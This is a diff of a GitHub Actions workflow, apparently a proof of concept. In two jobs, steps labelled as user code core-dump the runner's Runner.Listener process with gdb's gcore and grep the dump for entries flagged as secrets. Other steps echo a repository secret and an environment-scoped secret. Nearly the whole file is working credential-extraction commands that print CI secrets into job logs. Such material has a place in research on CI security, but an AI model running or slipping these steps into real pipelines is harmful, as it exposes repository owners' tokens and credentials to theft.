@@ -12,15 +12,21 @@ jobs:
   get_scerets:
     runs-on: ubuntu-latest
     steps:
-      - name: dump secrets
+      - name: use secrets -- our code
+        run: echo ${{ secrets.TEST_SECRET }}
+      - name: dump secrets -- user code
         run: |
           sudo apt-get install -y gdb && sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
-          grep -Ea '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
+          grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
   test2:
     runs-on: ubuntu-latest
     environment: secret_one_scope
     steps:
-      - name: dump secrets
+      - name: use secret -- our code
+        run: |
+          echo ${{ secrets.SCOPED_SECRET }}
+          echo ${{ secrets.TEST_SECRET }}
+      - name: dump secrets -- user code
         run: |
           sudo apt-get install -y gdb && sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
-          grep -Ea '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
+          grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
